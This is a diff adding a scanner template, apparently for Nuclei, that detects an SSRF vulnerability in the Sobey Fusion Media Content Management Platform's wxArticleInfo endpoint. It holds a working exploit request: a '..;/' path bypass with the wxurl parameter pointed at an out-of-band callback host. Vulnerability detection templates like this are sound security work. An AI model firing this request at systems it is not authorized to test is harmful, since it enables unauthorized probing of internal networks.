@@ -1,0 +1,36 @@
+id: poc-yaml-sobey-imcmp-wxarticleinfo-ssrf
+info:
+  name: Sobey Fusion Media Content Management Platform wxArticleInfo SSRF Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: ssrf,dnslog
+
+variables:
+  reverse: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        GET /sobey-mchEditor/js/..;/mch/WXArticleInt/wxArticleInfo?siteCode=&token=&wxurl=https://{{reverse}}/xxe_test HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"data":null'
+          - '"message":"解析公众号文章失败"'
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
